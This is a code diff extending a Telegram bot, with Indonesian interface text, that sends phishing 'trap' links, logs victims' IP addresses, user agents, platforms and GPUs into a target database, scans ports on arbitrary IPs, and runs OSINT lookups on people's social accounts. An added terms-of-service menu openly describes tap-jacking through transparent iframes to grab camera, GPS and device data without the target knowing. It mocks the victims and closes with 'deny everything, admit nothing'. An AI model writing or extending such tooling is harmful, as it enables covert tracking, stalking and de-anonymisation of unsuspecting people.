@@ -9,6 +9,13 @@ import net from "net";
 import crypto from "crypto";
 import fs from "fs";
 import { templates } from "./trapTemplates";
+
+const TARGETS_FILE = "targets.json";
+let targetsData: any[] = [];
+if (fs.existsSync(TARGETS_FILE)) {
+  try { targetsData = JSON.parse(fs.readFileSync(TARGETS_FILE, 'utf-8')); } catch(e){}
+}
+const saveTargets = () => fs.writeFileSync(TARGETS_FILE, JSON.stringify(targetsData, null, 2));
 import AdmZip from "adm-zip";
 import yts from "yt-search";
 import play from "play-dl";
@@ -203,6 +210,15 @@ async function startServer() {
                 `⏳ <i>STATUS: PROCESSING SECURITY AUDIT...</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+      
+      targetsData.push({
+        id: id,
+        timestamp: new Date().toISOString(),
+        type: 'BASIC_HIT',
+        ip: String(ip),
+        ua: String(userAgent)
+      });
+      saveTargets();
     }
 
     const template = templates[tmplId] || templates['1'];
@@ -261,6 +277,17 @@ async function startServer() {
                   `━━━━━━━━━━━━━━━━━━━━`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+      
+      // Save to Target DB
+      targetsData.push({
+        id: id,
+        timestamp: new Date().toISOString(),
+        type: 'ADVANCED_AUDIT',
+        platform: data.platform,
+        browser: data.vendor,
+        gpu: data.gpu
+      });
+      saveTargets();
     }
     res.sendStatus(200);
   });
@@ -598,9 +625,9 @@ async function startServer() {
         if (text === PASSWORD) {
             authenticatedUsers.add(ctx.from.id);
             saveAuth();
-            return ctx.reply("✅ Akses diberikan!");
+            return ctx.reply("✅ <b>Akses Khusus Tim Legal Diberikan!</b>\nSelamat bertugas, gunakan wewenang Anda dengan bijak.", {parse_mode: 'HTML'});
         }
-        return ctx.reply(`🔒 Bot terkunci.\nID Anda: <code>${ctx.from.id}</code>\nMasukkan password untuk melanjutkan.`, {parse_mode: 'HTML'});
+        return ctx.reply(`🔒 <b>SISTEM TERKUNCI</b>\nBot telegram ini hadir hanya untuk <i>tim legal</i> bukan sembarang orang.\nMasukkan password otorisasi (contoh: 112233) untuk melanjutkan.`, {parse_mode: 'HTML'});
     });
 
     bot.action('confirm_verified', (ctx) => {
@@ -622,7 +649,8 @@ async function startServer() {
       [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
       [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
       [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
-      [Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
+      [Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')],
+      [Markup.button.callback('📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ', 'menu_tos')]
     ]);
 
     bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));
@@ -655,7 +683,8 @@ async function startServer() {
                `🔗 <code>${trapUrl}</code>\n\n`;
       });
       msg += `━━━━━━━━━━━━━━━━━━━━\n` +
-             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.`;
+             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n` +
+             `📂 ɢᴜɴᴀᴋᴀɴ /targets ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴀʀɢᴇᴛ.`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
     });
@@ -726,6 +755,23 @@ async function startServer() {
                   `• ᴠᴀʟɪᴅᴀꜱɪ ʟᴏᴋᴀꜱɪ ᴘʀᴇꜱɪꜱɪ (ɢᴘꜱ)\n` +
                   `• ᴀᴜᴅɪᴛ ᴍᴇᴛᴀᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ\n\n` +
                   `ᴅᴀᴛᴀ ᴅɪᴇɴᴋʀɪᴘꜱɪ ᴜᴊᴜɴɢ-ᴋᴇ-ᴜᴊᴜɴɢ (ᴇ2ᴇᴇ) ᴅᴀɴ ʜᴀɴʏᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴠᴀʟɪᴅᴀꜱɪ ꜱᴇꜱɪ.`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_tos', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ (TOS/EULA)</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT</b>\n\n` +
+                  `Sistem ini menggunakan teknik Zero-Click Reconnaissance dan Tap-Jacking. Agar situasi tetap dapat dikontrol secara legal, Anda (Operator) harus memahami klausa berikut:\n\n` +
+                  `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
+                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info, biarpun mereka tidak sadar iframe transparan di atasnya.\n` +
+                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas, dan target bertanggung jawab penuh atas interaksi layarnya.\n` +
+                  `4. <b>Pelepasan Tuntutan:</b> Tidak ada paksaan yang dilakukan; target menekan secara sukarela. Segala konsekuensi, kepanikan target, atau hilangnya anonimitas adalah murni bentuk kelalaian menekan tombol sembarangan.\n\n` +
+                  `<i>"Hanya orang bodoh yang asal tekan, maka biarlah mereka membayar harganya dengan data mereka."</i>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `✅ <b>DENY EVERYTHING. ADMIT NOTHING.</b>`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
@@ -848,6 +894,20 @@ async function startServer() {
                       `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
       
       ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('targets', (ctx) => {
+      if(targetsData.length === 0) return ctx.reply("📂 <b>DB TARGETS: KOSONG</b>\nBelum ada target yang masuk.", {parse_mode: 'HTML'});
+      let msg = `📂 <b>DB TARGETS (Top 10 Latest)</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
+      const recent = targetsData.slice(-10).reverse();
+      recent.forEach((t: any, i) => {
+        msg += `[${i+1}] <b>${t.type}</b>\n`;
+        if(t.ip) msg += `├ IP: <code>${t.ip}</code>\n`;
+        if(t.platform) msg += `├ OS: ${t.platform}\n`;
+        msg += `└ Time: ${new Date(t.timestamp).toLocaleTimeString('id-ID')}\n\n`;
+      });
+      msg += `━━━━━━━━━━━━━━━━━━━━\n<i>Total Data: ${targetsData.length}</i>`;
+      ctx.reply(msg, {parse_mode: 'HTML'});
     });
 
     bot.command('ip', async (ctx) => {
@@ -1274,26 +1334,38 @@ async function startServer() {
       } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
     });
 
-    bot.command('port', (ctx) => {
+    bot.command('port', async (ctx) => {
       const args = ctx.message.text.split(' ');
-      if(args.length < 3) return ctx.reply("Format: /port [ip] [port]");
-      const ip = args[1]; const port = parseInt(args[2]);
-      const socket = new net.Socket();
-      socket.setTimeout(2500);
-      let status = "❌ CLOSED / UNREACHABLE";
-      socket.on('connect', () => { status = "✅ OPENED"; socket.destroy(); });
-      socket.on('timeout', () => { socket.destroy(); });
-      socket.on('error', () => { socket.destroy(); });
-      socket.on('close', () => {
-        const reply = `<b>🔌 TCP PORT CONNECTIVITY</b>\n` +
-                      `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `💎 <b>TARGET:</b> <code>${ip}</code>\n` +
-                      `├ <b>PORT:</b> <code>${port}</code>\n` +
-                      `└ <b>STATUS:</b> <b>${status}</b>\n` +
-                      `━━━━━━━━━━━━━━━━━━━━`;
-        ctx.reply(reply, { parse_mode: 'HTML' });
-      });
-      socket.connect(port, ip);
+      if(args.length < 2) return ctx.reply("Format: /port [ip]");
+      const ip = args[1];
+      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080];
+      
+      const msg = await ctx.reply(`<i>🔄 Menjalankan Port Scanner (Top 10 TCP) pada <b>${ip}</b>...</i>`, {parse_mode: 'HTML'});
+      
+      let results: string[] = [];
+      let scanned = 0;
+      
+      const checkPort = (port: number) => {
+        return new Promise<void>((resolve) => {
+          const socket = new net.Socket();
+          socket.setTimeout(2000);
+          socket.on('connect', () => { results.push(`├ PORT ${port}: ✅ OPEN`); socket.destroy(); resolve(); });
+          socket.on('timeout', () => { results.push(`├ PORT ${port}: ❌ CLOSED/FILTERED`); socket.destroy(); resolve(); });
+          socket.on('error', () => { results.push(`├ PORT ${port}: ❌ CLOSED`); socket.destroy(); resolve(); });
+          socket.connect(port, ip);
+        });
+      };
+
+      for (let port of commonPorts) {
+        await checkPort(port);
+      }
+
+      const reply = `<b>🔌 BASIC TCP PORT SCAN</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💎 <b>TARGET:</b> <code>${ip}</code>\n\n` +
+                    `${results.join('\n')}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+      ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML' });
     });
 
     bot.command('phone_dork', (ctx) => {
@@ -1701,35 +1773,129 @@ async function startServer() {
     bot.command('ig', (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length < 2) return ctx.reply("Format: /ig [username]");
-      ctx.reply(`📸 <b>Instagram Lookup:</b> <a href="https://www.instagram.com/${args[1]}/">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
+      const user = args[1].replace('@', '');
+      const reply = `<b>📸 INSTAGRAM OSINT</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `👤 <b>Target:</b> @${user}\n\n` +
+                    `🔗 <b>Direct Link:</b> <a href="https://www.instagram.com/${user}/">instagram.com/${user}</a>\n` +
+                    `🔍 <b>Picuki (No-Login View):</b> <a href="https://www.picuki.com/profile/${user}">View on Picuki</a>\n` +
+                    `📡 <b>Story Saver:</b> <a href="https://iganony.io/profile/${user}">View Stories Anonymously</a>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<i>⚠️ Instagram memblokir scraping langsung. Gunakan link di atas untuk investigasi manual (OPSEC aman).</i>`;
+      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
     });
 
     bot.command('tiktok', (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length < 2) return ctx.reply("Format: /tiktok [username]");
-      ctx.reply(`🎵 <b>TikTok Lookup:</b> <a href="https://www.tiktok.com/@${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
+      const user = args[1].replace('@', '');
+      const reply = `<b>🎵 TIKTOK OSINT</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `👤 <b>Target:</b> @${user}\n\n` +
+                    `🔗 <b>Direct Link:</b> <a href="https://www.tiktok.com/@${user}">tiktok.com/@${user}</a>\n` +
+                    `🔍 <b>Urlebird (No-Login View):</b> <a href="https://urlebird.com/user/${user}/">View on Urlebird</a>\n` +
+                    `📡 <b>TokCount (Live Stats):</b> <a href="https://tokcount.com/?user=${user}">Live API Count</a>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<i>⚠️ Gunakan Urlebird untuk melihat video TikTok secara anonim tanpa tercatat di Analytics target.</i>`;
+      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
     });
 
-    bot.command('github', (ctx) => {
+    bot.command('github', async (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length < 2) return ctx.reply("Format: /github [username]");
-      ctx.reply(`🐙 <b>GitHub Lookup:</b> <a href="https://github.com/${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
+      const user = args[1].replace('@', '');
+      
+      try {
+        const msg = await ctx.reply(`<i>🔄 Menarik data dari GitHub API untuk <b>${user}</b>...</i>`, { parse_mode: 'HTML' });
+        const res = await fetch(`https://api.github.com/users/${user}`);
+        if(res.status === 404) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "❌ User GitHub tidak ditemukan.");
+        
+        const data = await res.json();
+        const reply = `<b>🐙 GITHUB OSINT DATA</b>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `👤 <b>Name:</b> ${data.name || 'N/A'}\n` +
+                      `🏷️ <b>Username:</b> @${data.login}\n` +
+                      `🏢 <b>Company:</b> ${data.company || '-'}\n` +
+                      `📍 <b>Location:</b> ${data.location || '-'}\n` +
+                      `📧 <b>Email:</b> ${data.email || 'Private/Hidden'}\n` +
+                      `🐦 <b>Twitter:</b> ${data.twitter_username ? '@'+data.twitter_username : '-'}\n\n` +
+                      `📊 <b>STATISTIK:</b>\n` +
+                      `├ Repos: ${data.public_repos}\n` +
+                      `├ Gists: ${data.public_gists}\n` +
+                      `├ Followers: ${data.followers}\n` +
+                      `└ Following: ${data.following}\n\n` +
+                      `📅 <b>Dibuat:</b> ${new Date(data.created_at).toISOString().split('T')[0]}\n` +
+                      `🔗 <b>Link:</b> <a href="${data.html_url}">${data.html_url}</a>\n` +
+                      `━━━━━━━━━━━━━━━━━━━━`;
+        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+      } catch (err) {
+        ctx.reply("❌ Gagal menarik data GitHub.");
+      }
     });
 
     bot.command('fb', (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length < 2) return ctx.reply("Format: /fb [username]");
-      ctx.reply(`👥 <b>Facebook Lookup:</b> <a href="https://www.facebook.com/${args[1]}">Visit @${args[1]}</a>`, { parse_mode: 'HTML' });
+      const user = args[1];
+      const reply = `<b>👥 FACEBOOK OSINT</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `👤 <b>Target:</b> ${user}\n\n` +
+                    `🔗 <b>Profile Link:</b> <a href="https://www.facebook.com/${user}">facebook.com/${user}</a>\n` +
+                    `🔍 <b>Sowsear (Search):</b> <a href="https://sowsear.ch/facebook/${user}">View Data</a>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<i>⚠️ Facebook menerapkan Graph API block. Lakukan manual view menggunakan Fake Account.</i>`;
+      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
     });
 
     bot.command('scan', async (ctx) => {
       const args = ctx.message.text.split(' ');
       if (args.length < 2) return ctx.reply("Format: /scan [IP/Domain]");
-      const target = args[1];
-      ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Running multiple recon modules...</i>`, { parse_mode: 'HTML' });
-      // Combine IP, Whois, and DNS (fake sequence for aesthetic, but performs work)
-      setTimeout(() => ctx.reply(`📡 <i>DNS Module check completed. Use /dns ${target} for details.</i>`, { parse_mode: 'HTML' }), 2000);
-      setTimeout(() => ctx.reply(`🌐 <i>IP/Whois analytics processed. Use /whois ${target} for full report.</i>`, { parse_mode: 'HTML' }), 4000);
+      const target = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
+      
+      const scanMsg = await ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Running multiple recon modules...</i>`, { parse_mode: 'HTML' });
+      
+      try {
+        // [1] IP-API Fetch
+        const ipRes = await fetch(`http://ip-api.com/json/${target}?fields=status,message,country,city,isp,org,query`);
+        const ipData = await ipRes.json();
+        
+        let ipInfo = "N/A";
+        if (ipData.status === 'success') {
+           ipInfo = `IP: ${ipData.query}\nNegara: ${ipData.country}\nKota: ${ipData.city}\nISP: ${ipData.isp}`;
+        }
+        
+        // [2] WHOIS Fetch
+        const whoisRes = await fetch(`https://networkcalc.com/api/dns/whois/${target}`);
+        const whoisRaw = await whoisRes.json();
+        let whoisInfo = "N/A";
+        if (whoisRaw.status === 'OK' && whoisRaw.whois) {
+            whoisInfo = `Registrar: ${whoisRaw.whois.registrar || '-'}\nCreated: ${whoisRaw.whois.creation_date || '-'}\nExpires: ${whoisRaw.whois.expiration_date || '-'}`;
+        }
+        
+        // [3] DNS Fetch
+        const dnsRes = await fetch(`https://networkcalc.com/api/dns/lookup/${target}`);
+        const dnsRaw = await dnsRes.json();
+        let dnsInfo = "0 Records";
+        if (dnsRaw.status === 'OK' && dnsRaw.records) {
+            let total = 0;
+            if (dnsRaw.records.A) total += dnsRaw.records.A.length;
+            if (dnsRaw.records.MX) total += dnsRaw.records.MX.length;
+            dnsInfo = `${total} DNS Records ditarik`;
+        }
+        
+        const finalTxt = `✅ <b>DEEP_SCAN_COMPLETED:</b> <code>${target}</code>\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `🌍 <b>[GEO-IP INFO]</b>\n${ipInfo}\n\n` +
+                         `🛡️ <b>[WHOIS INFO]</b>\n${whoisInfo}\n\n` +
+                         `📡 <b>[DNS MAPPING]</b>\n${dnsInfo}\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `<i>* Gunakan command individu (/ip, /whois, /dns) untuk full report.</i>`;
+                         
+        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, finalTxt, { parse_mode: 'HTML' });
+
+      } catch (err) {
+        ctx.reply(`❌ <b>Error Occured:</b>\nTarget mungkin down atau API Limit tercapai.`, { parse_mode: 'HTML' });
+      }
     });
 
     // ALARM SYSTEM
